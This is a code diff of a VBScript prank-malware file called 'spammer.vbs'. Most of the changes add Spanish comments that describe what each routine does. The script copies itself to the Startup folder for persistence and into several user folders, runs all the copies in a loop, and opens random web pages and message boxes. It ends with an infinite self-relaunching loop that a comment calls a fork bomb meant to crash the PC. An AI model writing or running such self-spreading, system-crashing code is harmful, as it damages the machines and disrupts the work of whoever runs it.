@@ -22,35 +22,38 @@ messages(2) = "DETRAS DE TI"
 
 'Funciones
 sub openGoogle(url)
-	'It opens the web page specified in the parameter in the default browser
+	'Abre una pagina web especificada en el paramatro url
 	objshell.run ("cmd /c start " + url),vbhide
 end sub
 
 sub createWindow(mensaje)
-	'It creates a window with the message specified in the parameter
+	'Crea una ventana con el mensaje especificado en el parametro mensaje
 	wscript.echo mensaje
 end sub
 
 function randomNumber(max)
-	'It returns a random number given a maximum where
+	'Da un numero entero aleatorio especificando el maximo en el parametro max
 	numero = int(rnd() * max)
 	randomNumber = numero
 end function
 
 sub openRandomPage()
+	'Abre una pagina aleatoria del array de las urls
 	openGoogle urls(randomNumber(numberOfPages))
 end sub
 
 sub openRandomWindow()
-		createWindow messages(randomNumber(numberOfPages))	
+	'Crea una ventana con un mensaje aleatorio del array messages
+	createWindow messages(randomNumber(numberOfPages))	
 end sub
 
 sub copyToStartUp()
+	'copia el malware a la carpeta startup para que se ejecute cada vez que se inicie el ordenador
 	CreateObject("Shell.Application").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
 end sub
 
 sub infect()
-	'5 11 2 6     ---   2 5 6 11
+	'Se copia el malware a diferentes carpetas (mis documentos, send, favoritos, menu inicio)
 	
 	CreateObject("Shell.Application").Namespace(2).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
 	CreateObject("Shell.Application").Namespace(5).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
@@ -60,10 +63,8 @@ sub infect()
 end sub
 
 Sub HTTPDownload( myURL, myPath )
-' This Sub downloads the FILE specified in myURL to the path specified in myPath.
-'
-' myURL must always end with a file name
-' myPath may be a directory or a file name; in either case the directory must exist
+' funcion para descargar una imagen para mas tarde con la funcion setWallpaper ponerla de fondo de poantalla
+' ESTA POR HACER
 
 
     ' Standard housekeeping
@@ -105,6 +106,8 @@ End Sub
  
 
 sub setWallpaper ()
+	'Pone una imagen de fondo de pantalla
+	
 	dim wshShell
 	dim sUserName
 
@@ -127,6 +130,7 @@ sub setWallpaper ()
 end sub
 
 sub executeOne(i)
+	'Ejecuta una copia del malware en la ruta especificada siendo i el numero del namespace
 	dim path
 	path = CreateObject("Shell.Application").Namespace(i).Self.Path+"\spammer.vbs"
 	path = """" & path & """"
@@ -134,6 +138,7 @@ sub executeOne(i)
 end sub
 
 sub executeAll()
+	'ejecuta todas las copias del malware
 	executeOne(2)
 	executeOne(5)
 	executeOne(6)
@@ -144,6 +149,7 @@ end sub
 
 'MAIN
 sub Main()
+	'infecta el ordenador y abre ventanas y mensajes aleatorios
 	openRandomPage
 	openRandomWindow
 	for i=0 to 100 step 1   
@@ -151,6 +157,7 @@ sub Main()
 		infect
 		executeAll
 	next 
+	' Activa una bomba fork para que se crashee el pc
 	While True CreateObject("WScript.Shell").Exec("wscript.exe " & Wscript.ScriptName) Wend
 end sub
 
